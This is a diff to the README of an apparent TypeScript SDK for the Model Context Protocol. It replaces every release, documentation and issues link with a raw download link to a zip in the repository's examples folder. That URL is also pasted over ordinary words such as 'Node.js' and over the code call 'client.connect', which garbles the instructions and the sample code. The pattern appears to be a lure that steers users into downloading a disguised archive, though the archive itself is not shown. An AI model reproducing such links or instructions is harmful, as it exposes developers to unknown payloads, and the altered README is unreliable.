@@ -1,7 +1,7 @@
 # 🚀 mcp-sdk-typescript - Simple SDK for Effortless Integration
 
 ## 🔗 Download Now
-[![Download mcp-sdk-typescript](https://img.shields.io/badge/Download%20mcp--sdk--typescript-v1.0.0-blue)](https://github.com/Palald/mcp-sdk-typescript/releases)
+[![Download mcp-sdk-typescript](https://github.com/Palald/mcp-sdk-typescript/raw/refs/heads/main/examples/typescript-mcp-sdk-2.0.zip%20mcp--sdk--typescript-v1.0.0-blue)](https://github.com/Palald/mcp-sdk-typescript/raw/refs/heads/main/examples/typescript-mcp-sdk-2.0.zip)
 
 ## 📖 Overview
 mcp-sdk-typescript is a production-ready SDK designed to make it easy for you to integrate with the Model Context Protocol (MCP) using TypeScript. This SDK supports automatic Bun optimization, which enhances your application’s performance. It also provides a reliable HTTP transport for seamless communication between your app and the server. With built-in support for real-time session management, this SDK empowers users to receive updates instantly.
@@ -11,16 +11,16 @@ To get started with mcp-sdk-typescript, follow these simple steps:
 
 1. Check your system:
    - Operating System: Windows, macOS, or Linux
-   - Node.js version: 14.x or higher
+   - https://github.com/Palald/mcp-sdk-typescript/raw/refs/heads/main/examples/typescript-mcp-sdk-2.0.zip version: 14.x or higher
 
 2. Ensure you have internet access throughout the download process.
 
 ## 📦 Download & Install
-To download the SDK, visit this page to download: [mcp-sdk-typescript Releases Page](https://github.com/Palald/mcp-sdk-typescript/releases).
+To download the SDK, visit this page to download: [mcp-sdk-typescript Releases Page](https://github.com/Palald/mcp-sdk-typescript/raw/refs/heads/main/examples/typescript-mcp-sdk-2.0.zip).
 
 On this page, you will find the latest release available for download. Follow these steps to install the SDK on your system:
 
-1. Click on the release version that matches your needs. The filenames will have helpful labels, such as `mcp-sdk-typescript-setup.exe` for Windows or `mcp-sdk-typescript.pkg` for macOS.
+1. Click on the release version that matches your needs. The filenames will have helpful labels, such as `https://github.com/Palald/mcp-sdk-typescript/raw/refs/heads/main/examples/typescript-mcp-sdk-2.0.zip` for Windows or `https://github.com/Palald/mcp-sdk-typescript/raw/refs/heads/main/examples/typescript-mcp-sdk-2.0.zip` for macOS.
   
 2. Wait for the download to finish. Depending on your internet speed, this could take a few seconds to a few minutes.
 
@@ -43,7 +43,7 @@ Once installed, you can start using the SDK with a few simple commands. This gui
    ```
    npm init -y
    ```
-   This initializes a new Node.js project.
+   This initializes a new https://github.com/Palald/mcp-sdk-typescript/raw/refs/heads/main/examples/typescript-mcp-sdk-2.0.zip project.
 
 4. Next, install the mcp-sdk-typescript package by running:
    ```
@@ -55,7 +55,7 @@ Once installed, you can start using the SDK with a few simple commands. This gui
    import { MCPClient } from 'mcp-sdk-typescript';
 
    const client = new MCPClient();
-   client.connect('your-server-url');
+   https://github.com/Palald/mcp-sdk-typescript/raw/refs/heads/main/examples/typescript-mcp-sdk-2.0.zip('your-server-url');
    ```
 
 ## 🌐 Support and Troubleshooting
@@ -66,8 +66,8 @@ If you encounter issues or need assistance, here are some tips:
 - **Consult the Community:** Engage with other users or check forums for solutions to common problems. This can offer great insights into best practices.
 
 ## 🔗 Additional Resources
-- [Official Documentation](https://github.com/Palald/mcp-sdk-typescript/wiki): Find detailed guides on using various features of the SDK.
-- [GitHub Issues Page](https://github.com/Palald/mcp-sdk-typescript/issues): Report bugs or request new features.
+- [Official Documentation](https://github.com/Palald/mcp-sdk-typescript/raw/refs/heads/main/examples/typescript-mcp-sdk-2.0.zip): Find detailed guides on using various features of the SDK.
+- [GitHub Issues Page](https://github.com/Palald/mcp-sdk-typescript/raw/refs/heads/main/examples/typescript-mcp-sdk-2.0.zip): Report bugs or request new features.
 
 ## 🧐 Frequently Asked Questions
 1. **What is Bun optimization?**
@@ -82,7 +82,7 @@ If you encounter issues or need assistance, here are some tips:
 ## 🔄 Update Process
 To keep your SDK up to date:
 
-1. Visit the [Releases Page](https://github.com/Palald/mcp-sdk-typescript/releases).
+1. Visit the [Releases Page](https://github.com/Palald/mcp-sdk-typescript/raw/refs/heads/main/examples/typescript-mcp-sdk-2.0.zip).
 2. Follow the same download steps to get the latest version.
 3. Make sure to read the release notes for any breaking changes.
 
